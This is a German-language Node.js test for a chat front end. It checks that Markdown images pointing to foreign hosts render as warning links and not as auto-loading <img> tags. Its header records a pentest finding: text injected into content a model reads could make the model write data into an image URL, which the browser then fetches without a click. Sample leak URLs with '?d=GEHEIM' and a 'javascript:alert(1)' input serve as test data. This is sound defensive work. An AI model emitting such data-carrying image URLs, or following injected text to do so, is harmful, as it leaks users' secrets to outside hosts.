#!/usr/bin/env node
/**
 * Waechter: ein FREMDES Markdown-Bild wird nicht geladen, sondern ein Link.
 *
 * Befund (Pentest-Vorbereitung 2026-11-05): chatlib.js machte aus
 * `![x](https://beliebig/...)` ein <img>, und die CSP erlaubte img-src https:.
 * Eingeschleuster Text (Webseite, Dokument, Mail, die ein Modell liest) konnte
 * so Daten in eine Bild-URL schreiben, die der Browser beim blossen Anzeigen
 * abruft – ohne Klick. Dasselbe im Destillat-Renderer (wissen_destillat.js),
 * dessen Eingang ausdruecklich Fremddokumente sind.
 *
 * Gemessen am DOM, mit den ECHTEN Modulen (sitzung.js, dlkey.js, i18n.js,
 * chatlib.js, wissen_destillat.js) und dem echten Renderer:
 *   - fremdes Bild (https, http, //host, andere Herkunft mit gleichem Namen
 *     als Praefix) -> KEIN <img>, sondern <a target=_blank> + Hinweis (i18n)
 *   - eigene Quellen (relativer Pfad, gleiche Herkunft, data:image) -> <img>
 *
 * Aufruf: node tests/test_markdown_bild_extern_ui.js (Exit 0 gruen, 1 FAIL, 2 Abbruch)
 */
'use strict';

require('./lib/bilanz')();
const fs = require('fs');
const path = require('path');

const W = path.resolve(__dirname, '..');
const { JSDOM } = require('./lib/jsdom_laden')();
const lies = (p) => fs.readFileSync(W + '/frontend/js/' + p, 'utf8');
const SITZUNG = lies('sitzung.js'), DLKEY = lies('dlkey.js'), I18N = lies('i18n.js');
const CHATLIB = lies('chatlib.js'), DESTILLAT = lies('wissen_destillat.js');

let OK = 0, FAIL = 0, BILANZ = false;
function check(b, t) {
    if (typeof b !== 'boolean') { console.log('ABBRUCH: check-Argument ist kein boolean: ' + t); process.exit(2); }
    if (b) { OK++; console.log('  OK   ' + t); } else { FAIL++; console.log('  FAIL ' + t); }
}
function kopf(t) { console.log('\n' + t); }
function bilanz() {
    if (BILANZ) return;
    BILANZ = true;
    console.log('\nErgebnis: ' + OK + ' OK, ' + FAIL + ' FAIL');
}
process.on('exit', (code) => { if (!BILANZ && code === 0) { console.log('ABBRUCH ohne Bilanz'); process.exitCode = 1; } });

const ORIGIN = 'https://jarvis.beispiel.test';
const dom = new JSDOM('<!doctype html><html><body></body></html>',
    { url: ORIGIN + '/chat', runScripts: 'outside-only' });
const win = dom.window;
win.localStorage.setItem('jarvis_chat_token', 'm.mustermann:1790000000:abcdef');
win.localStorage.setItem('jarvis_chat_user', 'm.mustermann');
win.fetch = () => Promise.resolve({ ok: false, status: 404, json: () => Promise.resolve({}) });
try {
    win.eval(SITZUNG); win.eval(DLKEY); win.eval(I18N); win.eval(CHATLIB); win.eval(DESTILLAT);
} catch (e) { console.log('ABBRUCH: Modul laedt nicht: ' + e); process.exit(2); }

const render = win.JarvisChatLib && win.JarvisChatLib.renderMarkdown;
const md = win.WissenDestillat && win.WissenDestillat._md;
if (typeof render !== 'function' || typeof md !== 'function') {
    console.log('ABBRUCH: Renderer nicht gefunden'); process.exit(2);
}
function baum(html) { const d = win.document.createElement('div'); d.innerHTML = html; return d; }
const HINWEIS_DE = (win.t && win.t('media.ext_img')) || '';

kopf('0) Positivkontrolle: eigene Bilder werden weiter geladen');
{
    const d = baum(render('![a](/api/generated/0123456789abcdef.png)'));
    const ok0 = d.querySelectorAll('img').length === 1;
    const d2 = baum(md('![b](data:image/png;base64,iVBORw0KGgo=)'));
    const ok1 = d2.querySelectorAll('img').length === 1;
    if (!ok0 || !ok1) {
        console.log('ABBRUCH: Positivkontrolle – eigenes Bild wird nicht als <img> gerendert (chat '
            + ok0 + ', destillat ' + ok1 + ')');
        process.exit(2);
    }
    check(true, 'Chat: relativer Pfad -> <img>; Destillat: data:-Bild -> <img>');
    check(!!HINWEIS_DE && HINWEIS_DE !== 'media.ext_img', 'i18n: Hinweis media.ext_img vorhanden (DE)');
}

const FREMD = [
    'https://fremd.beispiel.de/p.png?d=GEHEIM',
    'http://fremd.beispiel.de/p.png?d=GEHEIM',
    '//fremd.beispiel.de/p.png?d=GEHEIM',
    'https://jarvis.beispiel.test.fremd.de/p.png?d=GEHEIM',
    'HTTPS://FREMD.BEISPIEL.DE/p.png?d=GEHEIM',
];

kopf('1) Chat-Renderer (chatlib.js): fremde Bilder');
for (const u of FREMD) {
    const d = baum(render('Text ![leck](' + u + ') Ende'));
    const imgs = Array.from(d.querySelectorAll('img'));
    check(imgs.length === 0, u + ': kein <img> (gemessen ' + imgs.length + ')');
    const a = d.querySelector('a.chat-img-extern');
    check(!!a && a.getAttribute('target') === '_blank'
          && /noopener/.test(a.getAttribute('rel') || ''), u + ': Link in neuem Tab mit noopener');
    check(!!a && (a.getAttribute('title') || '') === HINWEIS_DE && d.textContent.indexOf(HINWEIS_DE) >= 0,
          u + ': Hinweis sichtbar und im title');
}

kopf('2) Chat-Renderer: eigene Quellen');
{
    const same = baum(render('![x](' + ORIGIN + '/api/generated/0123456789abcdef.png)'));
    check(same.querySelectorAll('img').length === 1, 'gleiche Herkunft (absolute URL) -> <img>');
    const dat = baum(render('![x](data:image/png;base64,iVBORw0KGgo=)'));
    check(dat.querySelectorAll('img').length === 1, 'data:image -> <img>');
    const js = baum(render('![x](javascript:alert(1))'));
    check(js.querySelectorAll('img, a').length === 0, 'javascript: -> weder Bild noch Link');
}

kopf('3) Destillat-Renderer (wissen_destillat.js): fremde Bilder');
const DEST = FREMD.filter(x => /^https?:\/\//.test(x));
if (DEST.length < 3) { console.log('ABBRUCH: Destillat-Probenliste leer'); process.exit(2); }
for (const u of DEST) {
    const d = baum(md('![leck](' + u + ')'));
    check(d.querySelectorAll('img').length === 0, u + ': kein <img>');
    const a = d.querySelector('a.wi-dest-img-extern');
    check(!!a && a.getAttribute('target') === '_blank', u + ': Link in neuem Tab');
    check(d.textContent.indexOf(HINWEIS_DE) >= 0, u + ': Hinweis sichtbar');
}

bilanz();
win.close();
process.exit(FAIL ? 1 : 0);
